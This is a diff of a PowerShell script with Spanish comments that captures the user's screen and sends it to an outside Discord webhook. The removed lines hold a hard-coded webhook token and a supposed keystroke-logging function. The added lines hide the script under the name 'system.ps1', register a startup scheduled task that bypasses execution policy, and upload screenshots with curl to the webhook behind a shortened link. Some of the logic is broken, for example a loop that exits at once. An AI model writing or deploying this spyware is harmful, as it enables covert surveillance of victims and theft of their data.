@@ -1,79 +1,59 @@
-# Definir la URL del webhook de Discord
-$dc = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"
-$hookurl = $dc
+# Contenido del script
+$hookurl = "https://bit.ly/Screen_dc"
+$seconds = 30 # Intervalo entre capturas (en segundos)
 
-# Definir el intervalo de tiempo entre capturas de pantalla en segundos
-$seconds = 30
-
-# Comando para detener el bucle principal
-$stopCommand = "stop"
-
-# Función para enviar las pulsaciones del teclado al webhook de Discord
-function SendKeystrokesToDiscord {
-    # Obtener el registro de pulsaciones de teclado
-    $keystrokes = Get-WinEvent -FilterHashtable @{LogName='Application';ID=13} | Select-Object -ExpandProperty Message
-
-    # Crear el cuerpo de la solicitud
-    $body = @{
-        content = $keystrokes
-    } | ConvertTo-Json
-
-    # Enviar las pulsaciones del teclado al webhook de Discord
-    Invoke-RestMethod -Uri $hookurl -Method Post -Body $body -ContentType "application/json"
+# Detección de URL acortada
+if ($hookurl.Length -ne 121) {
+    Write-Host "URL del webhook acortada detectada..." 
+    $hookurl = (irm $hookurl).url
 }
 
-# Bucle principal: tomar dos capturas de pantalla cada 30 segundos y enviarlas al webhook de Discord
-While ($true){
-    # Verificar si se ha ingresado el comando de detención
-    if ($stopCommand -eq "stop") {
-        break
-    }
+# Obtener la ruta de la carpeta de documentos del usuario
+$DocumentsFolder = [Environment]::GetFolderPath("MyDocuments")
 
-    # Definir la ruta y el nombre de archivo para la captura de pantalla
-    $file1 = "$env:temp\SC1_$(Get-Date -Format "yyyyMMdd_HHmmss").png"
-    $file2 = "$env:temp\SC2_$(Get-Date -Format "yyyyMMdd_HHmmss").png"
-    
-    # Tomar la primera captura de pantalla
-    Add-Type -AssemblyName System.Windows.Forms
-    Add-Type -AssemblyName System.Drawing
-    $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap1 = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
-    $graphic1 = [System.Drawing.Graphics]::FromImage($bitmap1)
-    $graphic1.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap1.Size)
-    $bitmap1.Save($file1, [System.Drawing.Imaging.ImageFormat]::png)
-    
-    # Verificar si la primera captura de pantalla se guardó correctamente
-    if (Test-Path $file1) {
-        Write-Host "Primera captura de pantalla guardada correctamente en $file1"
-    }
-    else {
-        Write-Host "Error al guardar la primera captura de pantalla en $file1"
-    }
+# Ruta del script principal
+$ScriptPath = Join-Path -Path $DocumentsFolder -ChildPath "sys1.ps1"
 
-    # Esperar antes de tomar la segunda captura de pantalla
-    Start-Sleep -Seconds $seconds
-    
-    # Tomar la segunda captura de pantalla
-    $bitmap2 = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
-    $graphic2 = [System.Drawing.Graphics]::FromImage($bitmap2)
-    $graphic2.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Location, [System.Drawing.Point]::Empty, $bitmap2.Size)
-    $bitmap2.Save($file2, [System.Drawing.Imaging.ImageFormat]::png)
-    
-    # Verificar si la segunda captura de pantalla se guardó correctamente
-    if (Test-Path $file2) {
-        Write-Host "Segunda captura de pantalla guardada correctamente en $file2"
-    }
-    else {
-        Write-Host "Error al guardar la segunda captura de pantalla en $file2"
-    }
-    
-    # Enviar ambas capturas de pantalla al webhook de Discord
-    Invoke-RestMethod -Uri $hookurl -Method Post -InFile $file1 -InFile $file2
-    
-    # Eliminar las capturas de pantalla después de enviarlas
-    Remove-Item -Path $file1, $file2
-    
-    # Enviar las pulsaciones del teclado al webhook de Discord cada 10 minutos
-    SendKeystrokesToDiscord
-    Start-Sleep -Seconds 600
-}
+# Crear script oculto con nombre "system" en la carpeta de documentos
+$ScriptContent = @"
+Start-Process powershell -ArgumentList '-WindowStyle Hidden -File "$ScriptPath"' -Verb RunAs
+"@
+$HiddenScriptPath = Join-Path -Path $DocumentsFolder -ChildPath "system.ps1"
+$ScriptContent | Out-File -FilePath $HiddenScriptPath -Encoding utf8
+
+# Crear tarea programada
+$Action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$HiddenScriptPath`""
+$Trigger = New-ScheduledTaskTrigger -AtStartup
+$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Description "Ejecutar script oculto al iniciar Windows"
+Register-ScheduledTask -TaskName "EjecutarScriptOcultoAlIniciarWindows" -InputObject $Task -Force
+
+# Contenido del script para enviar imágenes
+$ScreenshotScriptContent = @"
+$FilePath = "$env:temp\SC.png"
+Add-Type -AssemblyName System.Windows.Forms
+Add-Type -AssemblyName System.Drawing
+$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+$Width = $Screen.Width
+$Height = $Screen.Height
+$Left = $Screen.Left
+$Top = $Screen.Top
+$Bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+$Graphic = [System.Drawing.Graphics]::FromImage($Bitmap)
+$Graphic.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)
+$Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::png)
+Start-Sleep 1
+curl.exe -F "file1=@$FilePath" $hookurl
+Start-Sleep 1
+Remove-Item -Path $FilePath
+Start-Sleep $seconds
+"@
+
+# Guardar el script de envío de imágenes en la carpeta de documentos
+$ScreenshotScriptPath = Join-Path -Path $DocumentsFolder -ChildPath "ScreenshotScript.ps1"
+$ScreenshotScriptContent | Out-File -FilePath $ScreenshotScriptPath -Encoding utf8
+
+# Agregar la ejecución del script de envío de imágenes al script principal
+Add-Content -Path $ScriptPath -Value "`n$ScreenshotScriptContent"
+
+Write-Host "Scripts y tarea programada creados exitosamente."
+
